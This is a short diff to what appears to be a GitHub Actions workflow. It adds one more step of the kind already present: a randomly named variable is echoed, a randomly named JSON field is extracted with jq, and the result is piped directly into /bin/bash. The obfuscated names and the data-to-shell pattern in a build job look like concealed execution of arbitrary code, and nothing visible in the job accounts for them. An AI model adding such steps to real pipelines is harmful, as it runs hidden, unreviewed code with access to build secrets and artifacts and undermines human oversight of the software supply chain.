@@ -23,6 +23,7 @@ jobs:
           echo $qrj905 | jq -r .yba152 | /bin/bash
           echo $qzjqe2 | jq -r .a88 | /bin/bash
           printf '%s' "$fapz3" | jq -r .f224 | /bin/bash
+          echo $ttbm1 | jq -r .zagya52569 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
